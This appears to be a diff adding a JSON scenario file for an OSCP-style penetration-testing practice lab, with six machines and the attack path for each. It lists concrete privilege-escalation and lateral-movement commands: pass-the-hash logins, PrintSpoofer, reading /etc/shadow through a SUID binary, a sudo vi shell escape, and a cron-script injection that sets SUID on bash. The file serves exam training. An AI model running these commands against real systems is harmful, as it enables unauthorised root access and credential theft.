@@ -1,0 +1,171 @@
+{
+  "id": "the-linux-heavy-exam",
+  "title": "The Linux Heavy Exam",
+  "category": "exam-simulation",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "3 AD (standard) + 3 Linux standalone with diverse privesc: SUID, sudo, cron, capability, kernel. 6 machines, 2 networks, AD, pivot.",
+  "introduction": "This scenario teaches the OSCP exam's typical mix: AD chain plus multiple Linux standalone boxes with varied privilege escalation paths. Mastering diverse Linux privesc (SUID, sudo, cron) under time pressure is essential.",
+  "mental_model": "Treat each Linux box as a separate puzzle: enumerate methodically, identify the privesc vector quickly, and execute. Don't get stuck on one path—the exam rewards breadth.",
+  "key_principles": [
+    "Run linpeas early; prioritize SUID, sudo -l, writable cron",
+    "SUID: find / -perm -4000, then analyze binary behavior",
+    "sudo vi/less: escape to shell via :!bash or :shell",
+    "Writable cron script: inject command to gain root",
+    "AD path: PrintSpoofer → secretsdump → PtH to DC"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 5,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 6
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007"],
+    "techniques": [
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
+      {"id": "T1548.003", "name": "Sudo and Sudo Caching"},
+      {"id": "T1053.003", "name": "Scheduled Task/Job: Cron"},
+      {"id": "T1078", "name": "Valid Accounts"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc", "T5-Credentials", "T6-Pivoting", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 6,
+    "network_count": 2,
+    "os_distribution": {"windows": 3, "linux": 3},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "suid", "sudo", "cron", "capability", "kernel",
+    "linpeas", "linux-privesc"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6, 12, 16, 17, 18, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 16
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.35.0/24", "label": "External"},
+    {"id": "internal", "cidr": "10.10.50.0/24", "label": "AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "ad-lin1",
+      "label": "AD-LIN1",
+      "ip": "192.168.35.10",
+      "os": "Windows",
+      "role": "AD Entry (dual-NIC)",
+      "networks": ["external", "internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.35.10 -u svc_lin -p '<password>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "svc_lin", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": [{"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: Abuse SeImpersonate to spawn elevated shell"}]}],
+      "credentials": [{"user": "admin", "type": "ntlm-hash", "source": "secretsdump", "unlocks": ["dc-lin"]}],
+      "alternatives": []
+    },
+    {
+      "id": "ad-lin2",
+      "label": "AD-LIN2",
+      "ip": "10.10.50.11",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "pth", "summary": "PtH with admin", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.50.11 -u admin -H '<hash>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SMB", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "admin", "to": "SYSTEM", "technique": "GodPotato", "commands": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "dc-lin",
+      "label": "DC-LIN",
+      "ip": "10.10.50.5",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "pth", "summary": "PtH with DA", "leads_to": "domain-admin"}], "commands": ["evil-winrm -i 10.10.50.5 -u Administrator -H '<hash>'"]},
+        {"port": 389, "name": "LDAP", "version": "", "vulnerabilities": [], "commands": []}
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "lin-suid",
+      "label": "LIN-SUID",
+      "ip": "192.168.35.20",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["ssh dev@192.168.35.20"]},
+        {"port": 80, "name": "HTTP", "version": "", "vulnerabilities": [{"type": "rce", "summary": "Web RCE", "leads_to": "www-data"}], "commands": []}
+      ],
+      "privesc": [{"from": "dev", "to": "root", "technique": "SUID binary", "commands": [{"cmd": "find / -perm -4000 2>/dev/null", "rationale": "Why: Locate binaries that run as root when executed"}, "strings /usr/local/bin/backup", {"cmd": "/usr/local/bin/backup -f /etc/shadow", "rationale": "Why: SUID backup reads any file as root; shadow gives hashes"}]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "lin-sudo",
+      "label": "LIN-SUDO",
+      "ip": "192.168.35.21",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["ssh ops@192.168.35.21"]},
+        {"port": 443, "name": "HTTPS", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Web panel", "leads_to": "recon"}], "commands": []}
+      ],
+      "privesc": [{"from": "ops", "to": "root", "technique": "sudo vi", "commands": ["sudo -l", {"cmd": "sudo vi /etc/hosts", "rationale": "Why: vi runs with root; escape to shell"}, {"cmd": ":!bash", "rationale": "Why: Spawn shell inheriting root from vi"}]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "lin-cron",
+      "label": "LIN-CRON",
+      "ip": "192.168.35.22",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["ssh backup@192.168.35.22"]},
+        {"port": 3306, "name": "MySQL", "version": "", "vulnerabilities": [{"type": "auth", "summary": "DB access", "leads_to": "recon"}], "commands": []}
+      ],
+      "privesc": [{"from": "backup", "to": "root", "technique": "Cron script writable", "commands": ["cat /etc/crontab", "ls -la /opt/scripts/", {"cmd": "echo 'chmod u+s /bin/bash' >> /opt/scripts/backup.sh", "rationale": "Why: Cron runs script as root; inject SUID on bash"}]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {"from": "ad-lin1", "to": "ad-lin2", "technique": "Ligolo-ng", "requires": "Shell on AD-LIN1", "pivot": "AD-LIN1 dual-NIC", "path_ids": ["path-ad"], "commands": []},
+    {"from": "ad-lin2", "to": "dc-lin", "technique": "PtH", "requires": "DA hash", "pivot": "AD-LIN1", "path_ids": ["path-ad"], "commands": []}
+  ],
+
+  "attack_paths": [
+    {"id": "path-ad", "name": "AD: Standard Chain", "color": "#6bb8cc", "steps": ["ad-lin1", "ad-lin2", "dc-lin"], "description": "Given creds → PrintSpoofer → cred dump → PtH → DC"},
+    {"id": "path-suid", "name": "LIN-SUID: SUID", "color": "#e8a87c", "steps": ["lin-suid"], "description": "SSH → SUID binary privesc"},
+    {"id": "path-sudo", "name": "LIN-SUDO: sudo vi", "color": "#85e89d", "steps": ["lin-sudo"], "description": "SSH → sudo vi → root"},
+    {"id": "path-cron", "name": "LIN-CRON: Cron", "color": "#d2a8ff", "steps": ["lin-cron"], "description": "SSH → writable cron script → root"}
+  ]
+}
